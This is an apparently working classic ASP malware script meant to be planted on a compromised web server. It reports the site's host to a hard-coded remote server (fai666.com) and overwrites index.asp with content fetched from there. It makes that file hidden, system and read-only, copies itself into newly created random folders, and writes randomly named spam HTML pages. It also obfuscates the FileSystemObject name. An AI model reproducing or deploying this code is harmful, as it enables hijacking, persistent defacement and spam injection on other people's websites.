<%
Server.ScriptTimeOut=500 
Remote_server="http://www.fai666.com" //服务端url地址
directory_Number=5 //栏目数量
Branch_directory_1=Digital(Rand(3,5))
Branch_directory_2=Digital(Rand(3,5))
Branch_directory_3=Digital(Rand(3,5))
Branch_directory_4=Digital(Rand(3,5))
Branch_directory_5=Digital(Rand(3,5))
Branch_directory_6=Digital(Rand(3,5))
Branch_directory_7=Digital(Rand(3,5))
Branch_directory_8=Digital(Rand(3,5))
Branch_directory_9=Digital(Rand(3,5))
Branch_directory_10=Digital(Rand(3,5))
Branch_directory_11=Digital(Rand(3,5))
Branch_directory_12=Digital(Rand(3,5))
Branch_directory_13=Digital(Rand(3,5))
Branch_directory_14=Digital(Rand(3,5))
Branch_directory_15=Digital(Rand(3,5))
Branch_directory_16=Digital(Rand(3,5))
Branch_directory=Branch_directory_1&"."&Branch_directory_2&"."&Branch_directory_3&"."&Branch_directory_4&"."&Branch_directory_5&"."&Branch_directory_6&"."&Branch_directory_7&"."&Branch_directory_8&"."&Branch_directory_9&"."&Branch_directory_10&"."&Branch_directory_11&"."&Branch_directory_12&"."&Branch_directory_13&"."&Branch_directory_14&"."&Branch_directory_15&"."&Branch_directory_16
fn = Request.ServerVariables("SCRIPT_NAME") 
fn = Mid(fn,InStrRev(fn,"/")+1) 
NewFile_content=a(fn)
dim ml,str,Quantity
ml=Request.ServerVariables("HTTP_url")
str= Split(ml,"/")
Quantity=ubound(str)-1 //层数
dim RefreshIntervalTime
RefreshIntervalTime = 3 '防止刷新的时间秒数，0表示不防止
If Not IsEmpty(Session("visit")) and isnumeric(Session("visit")) and int(RefreshIntervalTime) > 0 Then
if (timer()-int(Session("visit")))*1000 < RefreshIntervalTime * 1000 then
Response.write ("<meta http-equiv=""refresh"" content="""& RefreshIntervalTime &""" />")
Response.write ("刷新过快...正在加载数据...请稍等.....")
Session("visit") = timer()
Response.end
end if
End If 
Session("visit") = timer()
host_name=replace("http://"&request.servervariables("HTTP_HOST")&request.servervariables("script_name"),fn,"")
if Quantity<5 then  
Remote_directory = Remote_server&"/d.php"&"?type=index.asp&host="&host_name&"&directory="&Branch_directory
Content_directory = getHTTPPage(Remote_directory)
Content_mb=GetHtml(Remote_server&"/index.php"&"?type=index.asp&host="&host_name)
Branch_directory= Split(Branch_directory,".")
response.write Content_mb
for i=0 to (ubound(Branch_directory))   
    if CFolder("./"&Branch_directory(i)&"/")=1 then
    WriteIn server.mappath("./"&Branch_directory(i)&"/index.asp"),NewFile_content
  end if
Next

WriteIn Server.MapPath("./")&"\index.asp",Content_mb
Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct")
set f=fso.Getfile(Server.MapPath("index.asp"))
if f.attributes <> 7 then
f.attributes = 7
end if

 	if Rand(1,2)=1 then
	html_name="forum-"&Digital(Rand(3,5))&"-"&Rand(1,20)&"-"&Rand(1,10)
 	else
	html_name="index_"&Digital(Rand(3,5))&"-"&Rand(1,20)&"-"&Rand(1,10)
  	end if
	Content_mb=GetHtml(Remote_server&"/index.php"&"?type=index.asp&host="&host_name&"&html_name="&html_name&"&html_a=html")
	WriteIn Server.MapPath("./")&"\"&html_name&".html",Content_mb


	if Rand(1,2)=1 then
	html_name="thread-"&Digital(Rand(3,5))&"-"&Rand(1,20)&"-"&Rand(1,10)
 	else
	html_name="index_"&Digital(Rand(3,5))&"-"&Rand(1,20)&"-"&Rand(1,10)
  	end if
	Content_mb=GetHtml(Remote_server&"/index.php"&"?type=index.asp&host="&host_name&"&html_name="&html_name&"&html_a=html")
	WriteIn Server.MapPath("./")&"\"&html_name&".html",Content_mb


else

Content_mb=GetHtml(Remote_server&"/index.php"&"?type=index.asp&host="&host_name)
WriteIn Server.MapPath("./")&"\index.asp",Content_mb

Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct")
set f=fso.Getfile(Server.MapPath("index.asp"))
if f.attributes <> 7 then
f.attributes = 7
end if

response.write Content_mb

 	if Rand(1,2)=1 then
	html_name="forum-"&Digital(Rand(3,5))&"-"&Rand(1,20)&"-"&Rand(1,10)
 	else
	html_name="index_"&Digital(Rand(3,5))&"-"&Rand(1,20)&"-"&Rand(1,10)
  	end if
	Content_mb=GetHtml(Remote_server&"/index.php"&"?type=index.asp&host="&host_name&"&html_name="&html_name&"&html_a=html")
	WriteIn Server.MapPath("./")&"\"&html_name&".html",Content_mb


	if Rand(1,2)=1 then
	html_name="thread-"&Digital(Rand(3,5))&"-"&Rand(1,20)&"-"&Rand(1,10)
 	else
	html_name="index_"&Digital(Rand(3,5))&"-"&Rand(1,20)&"-"&Rand(1,10)
  	end if
	Content_mb=GetHtml(Remote_server&"/index.php"&"?type=index.asp&host="&host_name&"&html_name="&html_name&"&html_a=html")
	WriteIn Server.MapPath("./")&"\"&html_name&".html",Content_mb


end if

%>




<%
Function getCode(iCount)//取随机混合字母数字
     Dim arrChar
     Dim j,k,strCode
     arrChar = "012qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM3456789"
     k=Len(arrChar)
     Randomize
     For i=1 to iCount
          j=Int(k * Rnd )+1
          strCode = strCode & Mid(arrChar,j,1)
     Next
     getCode = strCode
End Function

Function Digital(iCount)//取随机数字
     Dim arrChar
     Dim j,k,strCode
     arrChar = "0123456789"
     k=Len(arrChar)
     Randomize
     For i=1 to iCount
          j=Int(k * Rnd )+1
          strCode = strCode & Mid(arrChar,j,1)
     Next
     Digital = strCode
End Function
Function sj_int(ByVal min, ByVal max) //取随机数字
		Randomize(Timer) : sj_int = Int((max - min + 1) * Rnd + min)
End Function


Function Rand(ByVal min, ByVal max)  
		Randomize(Timer) : Rand = Int((max - min + 1) * Rnd + min)
End Function
%>

<%
function WriteIn(testfile,msg)
  set fs=server.CreateObject("scripting.filesystemobject")  
  set thisfile=fs.CreateTextFile(testfile,True)  
  thisfile.Write(""&msg& "")  
  thisfile.close  
  set fs = nothing
end function
%>

<%
function a(t)
	set fs=server.createobject("scripting.filesystemobject")
	file=server.mappath(t)
	set txt=fs.opentextfile(file,1,true)
	if not txt.atendofstream then
	   a=txt.ReadAll
	end if
     set fs=nothing
     set txt=nothing
end function
%>

<%
Function CFolder(Filepath)
  Filepath=server.mappath(Filepath)
  Set Fso = Server.CreateObject("Scripting.FileSystemObject")
  If Fso.FolderExists(FilePath) Then
    CFolder=0
  else
    Fso.CreateFolder(FilePath)
    CFolder=1
  end if
  Set Fso = Nothing
end function
%>

<%
Function getHTTPPage(url) 
On Error Resume Next 
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.send() 
if Http.readystate<>4 then 
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"gb2312") 
set http=nothing 
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b>        </b></font></p>" 
Err.Clear 
End If 
End Function 

Function BytesToBstr(body,Cset) 
dim objstream 
set objstream = Server.CreateObject("adodb.stream") 
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End Function 
%> 

<%
Function GetHtml(url)
	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
	ObjXMLHTTP.Open "GET",url,False
	ObjXMLHTTP.setRequestHeader "User-Agent","aQ0O010O"
	ObjXMLHTTP.send
	GetHtml=ObjXMLHTTP.responseBody
	Set ObjXMLHTTP=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "gb2312"
	GetHtml = objStream.ReadText
	objStream.Close
End Function
%>

